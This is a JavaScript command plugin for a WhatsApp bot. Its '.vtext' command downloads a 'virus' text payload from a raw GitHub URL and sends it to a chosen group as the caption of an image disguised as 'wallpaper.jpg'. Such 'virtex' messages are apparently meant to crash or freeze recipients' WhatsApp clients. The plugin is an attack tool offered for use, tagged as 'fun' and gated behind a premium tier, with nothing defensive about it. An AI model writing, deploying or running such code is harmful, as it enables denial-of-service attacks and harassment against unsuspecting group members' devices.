import fetch from 'node-fetch'

let handler = async (m, {text, conn, args}) => {
  if (!args[0]) throw `Use example .vtext groupID`
  let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
  let bcbg = 'https://telegra.ph/file/bca700eefeeed8f2cb054.jpg'
  conn.sendFile(text, bcbg, 'wallpaper.jpg', virus, m)
  m.reply(`Virtext berhasil di kirim ke Group ${text}`)
}
handler.command = ['vtext']
handler.tags = ['fun']
handler.help = ['vtext']

handler.premium = true

export default handler
